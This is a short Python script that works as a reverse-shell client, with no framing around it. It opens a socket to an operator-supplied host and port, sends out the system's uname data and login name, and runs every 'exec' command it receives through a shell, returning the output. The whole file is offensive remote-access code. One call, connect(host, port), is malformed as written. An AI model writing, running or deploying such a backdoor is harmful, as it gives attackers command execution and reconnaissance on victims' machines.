#!/usr/bin/env python
import socket, subprocess as sp, sys, os

def connect():
    try:
        host = sys.argv[1]
        port = int(sys.argv[2])
    except Exception as e:
        sys.exit(1)
    conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    conn.connect(host, port)

    x_info = ""
    for x in os.uname():
        x_info += x + ","
    x_info += os.getlogin()

    conn.send(x_info)
    interactive_session(conn)
    conn.close()

def interactive_session(conn):
    while 1:
        try:
            command = str(conn.recv(1024))
        except socket.error:
            sys.exit(1)
        if command.split(" ")[0] == "exec":
            res =1
            msg = ""
            while len(command.split(" ")) > res:
                msg += command.split(" ")[res]+ " "
                res += 1
            sh = sp.Popen(msg,shell=True, stdout=sp.PIPE, stderr=sp.PIPE, stdin=sp.PIPE)
            out,err = sh.communicate()
            result = str(out) + str(err)
            send_data(conn, result)
        elif command == "exit()":
            break
        else:
            send_data(conn, "[-] unknown command ")


def send_data(conn, data):
    length = str(len(data)).zfill(16)
    conn.send(length + data)

if __name__ == "__main__":
    connect()
